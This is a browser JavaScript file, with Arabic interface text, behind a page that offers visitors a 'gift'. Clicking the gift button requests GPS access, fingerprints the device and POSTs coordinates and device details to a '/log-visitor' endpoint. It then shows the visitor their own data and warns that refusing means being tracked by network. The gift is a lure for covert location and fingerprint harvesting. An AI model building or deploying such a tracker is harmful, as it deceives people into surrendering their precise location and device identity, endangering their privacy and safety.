document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("giftBtn").onclick = function () {
        document.getElementById("giftScreen").style.display = "none";

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const gpsLat = pos.coords.latitude.toFixed(4);
                const gpsLon = pos.coords.longitude.toFixed(4);

                const ua = navigator.userAgent;
                const platform = navigator.platform.toLowerCase();

                let os = "غير معروف";
                if (platform.includes("win")) os = "Windows";
                else if (platform.includes("mac")) os = "macOS";
                else if (platform.includes("linux")) os = "Linux";
                else if (/android/i.test(ua)) os = "Android";
                else if (/iphone|ipad/i.test(ua)) os = "iOS";

                let browser = "غير معروف";
                if (ua.includes("Firefox")) browser = "Firefox";
                else if (ua.includes("Chrome")) browser = "Chrome";
                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
                else if (ua.includes("Edg")) browser = "Microsoft Edge";

                const isMobile = /Mobi|Android/i.test(ua) ? "جوال" : "كمبيوتر";
                const screenResolution = `${window.screen.width}x${window.screen.height}`;

                const payload = {
                    userAgent: ua,
                    language: navigator.language,
                    platform: os,
                    browser: browser,
                    device: isMobile,
                    resolution: screenResolution,
                    time: new Date().toISOString(),
                    localTime: new Date().toLocaleString(),
                    cpuCores: navigator.hardwareConcurrency || "غير معروف",
                    touchSupport: navigator.maxTouchPoints > 0 ? "يدعم اللمس" : "بدون لمس",
                    pixelRatio: window.devicePixelRatio,
                    connection: navigator.connection ? navigator.connection.effectiveType : "غير معروف",
                    gps: `${gpsLat}, ${gpsLon}`
                };

                fetch('/log-visitor', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                document.getElementById("location").innerText = `(${gpsLat}, ${gpsLon})`;
                document.getElementById("platform").innerText = payload.platform;
                document.getElementById("browser").innerText = payload.browser;
                document.getElementById("device").innerText = payload.device;
                document.getElementById("res").innerText = payload.resolution;
                document.getElementById("lang").innerText = payload.language;
                document.getElementById("time").innerText = payload.time;
                document.getElementById("localTime").innerText = payload.localTime;
                document.getElementById("cpuCores").innerText = payload.cpuCores;
                document.getElementById("touchSupport").innerText = payload.touchSupport;
                document.getElementById("pixelRatio").innerText = payload.pixelRatio;
                document.getElementById("connection").innerText = payload.connection;

                document.getElementById("alert").innerText = `📍 تم تحديد موقعك عبر GPS: (${gpsLat}, ${gpsLon})`;
                document.getElementById("alert").style.display = 'block';
            },
            () => {
                document.getElementById("giftScreen").style.display = "none";
                document.getElementById("alert").innerText = "🚨 تم رفض الوصول للموقع... سيتم تتبعك عبر الشبكة فقط.";
                document.getElementById("alert").style.display = 'block';
            }
        );
    };
});
